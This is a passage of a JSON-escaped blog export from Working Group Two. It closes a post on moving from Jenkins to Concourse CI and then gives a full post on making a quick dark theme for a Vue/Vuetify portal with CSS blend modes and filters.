concourse using this mechanism.\\n\\n\\n## Learning curve\\n\\nThe move from Jenkins to Concourse has overall been a very positive step for us. If there has been any drawback it\'s that implementing any brand new system usually means something of a learning curve, and Concourse is no exception.\\n\\nThe documentation is sometimes a bit minimal, but now that we have a number of pipelines up and running we\'re finding it easier and easier to add more.\\nSimilarly, it took some time to settle on how to allocate resources such that we cope with load but aren\'t wasteful at quiet times.\\n\\n\\n## Summary\\n\\nThe biggest improvements of Concourse over Jenkins have been:\\n\\n* clean UI, no clicky clicky\\n* every build uses its own container - no shared dependencies or artifacts\\n* configuration of Concourse in code (in Kubernetes) - easy to upgrade and redeploy Concourse\\n* configuration of pipelines in code - good visibility into running tasks\\n* wide range of resource types\\n* ability to extend resources\\n* easy to troubleshoot and debug\\n\\nOverall, we\'re pretty pleased with Concourse. There are a few features we\'re eagerly awaiting in future releases, such as re-running targeted builds, but for the most part it has been relatively straightforwards to import all our existing jobs from Jenkins and add more.\\n\\n\\n## References\\n\\n* <https://github.com/concourse>\\n* <https://content.pivotal.io/blog/the-making-of-a-cloud-native-ci-cd-tool-the-concourse-journey>\\n* <https://github.com/karlkfi/concourse-dcind>\\n* <https://github.com/concourse/docker-image-resource/blob/master/assets/common.sh>\\n* <https://concoursetutorial.com>"},{"id":"hacking-dark-themes-with-css-blend-modes/","metadata":{"permalink":"/jp/blog/hacking-dark-themes-with-css-blend-modes/","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2019-06-25-hacking-dark-themes-with-blend-modes.md","source":"@site/../blog/2019-06-25-hacking-dark-themes-with-blend-modes.md","title":"Hacking dark themes with CSS blend modes","description":"Like many other companies, Working Group Two has a number of applications which are","date":"2019-06-25T00:00:00.000Z","formattedDate":"June 25, 2019","tags":[{"label":"CSS","permalink":"/jp/blog/tags/css"},{"label":"frontend","permalink":"/jp/blog/tags/frontend"},{"label":"design","permalink":"/jp/blog/tags/design"}],"readingTime":5.72,"hasTruncateMarker":true,"authors":[{"name":"David \xc5se","title":"Engineering Manager for Ecosystem","url":"https://linkedin.com/in/davidaase","imageURL":"/img/author-photos/daa.jpg","key":"david-\xe5se"}],"frontMatter":{"slug":"hacking-dark-themes-with-css-blend-modes/","title":"Hacking dark themes with CSS blend modes","date":"2019-06-25T00:00:00.000Z","tags":["CSS","frontend","design"],"authors":["david-\xe5se"]},"prevItem":{"title":"We killed the butler: Replacing Jenkins with Concourse","permalink":"/jp/blog/replacing-jenkins-with-concourse"}},"content":"Like many other companies, [Working Group Two](/) has a number of applications which are\\nonly available internally or to partners.\\nOur UI designer (that\'s me) prefers light backgrounds with dark text, but one of our\\npartners have wanted a dark theme for one of our applications for some time.\\nWe haven\'t been able to prioritize this, but we were using CSS blend modes for a different project,\\nand wondered if we could use them to quickly put together a dark theme.\\n\\n\x3c!--truncate--\x3e\\n\\nThe application in this post is one of our partner portals, which follows the Material Design\\nguidelines. It\u2019s built with [Vue](https://vuejs.org/) and [Vuetify](https://vuetifyjs.com/en/),\\nbut also has some custom components and JS plugins (for uploads, charts, etc).\\nIt took two hours to create the dark theme and deploy it to production, and we\'ll walk\\nyou through the whole process (with screenshots) in this post.\\n\\n## What are CSS blend modes?\\nMozilla has a [page](https://developer.mozilla.org/en-US/docs/Web/CSS/blend-mode) which explains\\nthe concept fairly well. In short, blend modes decide what should happen when two colors are\\nput on top of each other. The default blend mode is `normal`, which is what most people are used to.\\nAs an example, the `normal` blend mode paints dark text on top of a light background on the\\npage you\u2019re reading right now.\\n\\nThe application we have is light and we want it to be dark, so we need to look for blend modes that\\ncan help with that. Scrolling through the [list at MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/blend-mode),\\none mode in particular stands out:\\n\\n```\\ndifference\\n    The final color is the result of subtracting the darker of the two colors from the lighter one.\\n    A black layer has no effect, while a white layer inverts the other layer\'s color.\\n```\\n\\n![Starting point, mostly basic Vuetify](/img/blog/blend-modes/01-console-subs-light.png)\\n![After applying](/img/blog/blend-modes/01-console-subs-difference.png)\\n\\nOkay, that\u2019s actually not too bad. There are some obvious issues, like the color hues being\\ninverted and everything being way too dark, but it should be possible to make some adjustments.\\n\\n## Working with a non-standard blend mode\\nThe most jarring issue is that the colors have been inverted.\\nOur teal logo is now red, and the red \\"unlocked account\\" icon we use in development mode is now teal.\\nThis is in line with the documentation for the `difference` blend mode, but luckily CSS also supports hue-rotation,\\nso we can just rotate the hue back 180 degrees. Our base style now looks like this:\\n\\n```css\\nhtml.dark-mode {\\n   mix-blend-mode: difference;\\n   filter: hue-rotate(180deg);\\n}\\n```\\n\\nHue is measured in degrees from 0 to 360, so we\'re flipping the hues twice.\\nBelow, you can see a color wheel with no effects (1), with blend-mode (2), and with blend mode and hue rotate (3).\\nAll the effects are applied to the same image here in your browser.\\n\\n\x3c!-- ![](/img/blog/blend-modes/color-mode-all.png) --\x3e\\n\\nAs you can see from the illustration, brightness and saturation\\nis not accounted for with hue-rotate, so most colors won\'t look the same.\\nThey will have the same hue though, so semantic meaning (red = danger, green = safe) is preserved.\\\\\\\\\\nWe\'re lucky that our brand color doesn\'t change too much!\\n\\nSo, this fixes our colors, but we also have to do something about the darkness.\\nThe whole application is pretty much pitch black, and to make it brighter we need to \u2026 turn down the brightness:\\n\\n```css\\nhtml.dark-mode {\\n   mix-blend-mode: difference;\\n   filter: hue-rotate(180deg) brightness(0.67);\\n}\\n```\\n\\nLet\'s have a look <small>(click to enlarge)</small>:\\n\\n\x3c!-- <div class=\\"uk-child-width-1-2 uk-child-width-1-2@s bordered-gallery\\" uk-grid uk-lightbox=\\"animation: fade\\">\\n    {% include image.html url=\\"/img/blog/blend-modes/01-console-subs-light.png\\" caption=\\"Starting point, mostly basic Vuetify\\"%}\\n    {% include image.html url=\\"/img/blog/blend-modes/01-console-subs-difference-filters.png\\" caption=\\"After applying blend mode and filters\\"%}\\n</div> --\x3e\\n\\nThat\u2019s a lot better (blend modes are fun!). Our dark theme is close to done now,\\nbut we have one problem remaining: shadows. Because of our blend mode, making\\nthings darker means making them brighter, so all our shadows look like white glows.\\nSince our base color is white/light gray, we can\u2019t simply change our shadows to white as there would be no contrast.\\nOur solution was to embrace the \u201cglow\u201d feel and change the shadows to brand colored glows <small>(click to enlarge)</small>:\\n\\n\x3c!-- <div class=\\"uk-child-width-1-2 uk-child-width-1-2@s bordered-gallery\\" uk-grid uk-lightbox=\\"animation: fade\\">\\n    {% include image.html url=\\"/img/blog/blend-modes/02-console-shadows-light.png\\" caption=\\"Normally, the menu creates a shadow on the background\\"%}\\n    {% include image.html url=\\"/img/blog/blend-modes/02-console-shadows-glow.png\\" caption=\\"More of a glow than a shadow\\"%}\\n</div> --\x3e\\n\\nAs you might have noticed in the previous screenshot, we also made some other adjustments.\\nWe made the logo white using a brightness filter, and we set the base font-weight to 700 (bold),\\nsince contrast is lower in the dark theme.\\n\\n## More comparison screenshots\\nThe following gallery shows some screenshots with custom components and JavaScript plugins.\\nNo additional CSS was written for any of the views <small>(click to enlarge)</small>:\\n\\n\x3c!-- <div class=\\"uk-child-width-1-3 uk-child-width-1-6@s bordered-gallery\\" uk-grid uk-lightbox=\\"animation: fade\\">\\n    {% include image.html url=\\"/img/blog/blend-modes/03-console-blacklist-light.png\\" caption=\\"A standard Vuetify data table\\"%}\\n    {% include image.html url=\\"/img/blog/blend-modes/03-console-blacklist-dark.png\\" caption=\\"It\'s not perfect in dark mode, but it works\\"%}\\n    {% include image.html url=\\"/img/blog/blend-modes/03-console-batch-light.png\\" caption=\\"Our upload component is custom, not related to Vuetify\\"%}\\n    {% include image.html url=\\"/img/blog/blend-modes/03-console-batch-dark.png\\" caption=\\"Blend mode covers all parts of the app\\"%}\\n    {% include image.html url=\\"/img/blog/blend-modes/03-console-stats-light.png\\" caption=\\"Charts are built with Charts.js\\"%}\\n    {% include image.html url=\\"/img/blog/blend-modes/03-console-stats-dark.png\\" caption=\\"Charts also look okay\\"%}\\n</div> --\x3e\\n\\n## Conclusion\\nAll in all, it took around two hours to create this dark theme. Most of the time was\\nspent experimenting with different settings to get acceptable contrast ratios.\\nThere are probably better ways of doing this, but this was incredibly quick,\\nand allowed us to deliver something we normally wouldn\'t be able to deliver.\\nOther than the shadows, nothing is particularly ugly, so we consider this a success.\\nThe whole style sheet is just a couple of selectors :\\n\\n\\n```css\\nhtml.dark-mode {\\n    mix-blend-mode: difference;\\n    filter: brightness(0.67) hue-rotate(180deg);\\n    font-weight: 700 !important;\\n}\\n\\n/* Glow for dropdown/card-hover*/\\n.dark-mode .v-menu__content,\\n.dark-mode .v-card--hover:hover {\\n    box-shadow: 0 5px 20px rgba(142, 255, 252, 0.74);\\n}\\n\\n.dark-mode .logo {\\n    filter: brightness(0);\\n}\\n```\\n\\nThanks for reading!\\n\\n## FAQ\\n\\n*\u201cMany CSS frameworks have a dark-mode, why not use that?\u201d*\\\\\\\\\\nVuetify also has a dark-mode. Most of the components they offer look okay in dark-mode, but we would have\\nto write custom CSS for our own components, and for other libraries we\u2019re using (primarily for charts).\\nThe great thing about the blend-mode hack is that is operates independently of any framework.\\nYou set it on an HTML tag and it treats everything the same way.\\n\\n*\u201cWhat about accessibility?\u201d*\\\\\\\\\\nYeah, this isn\'t great for accessibility.
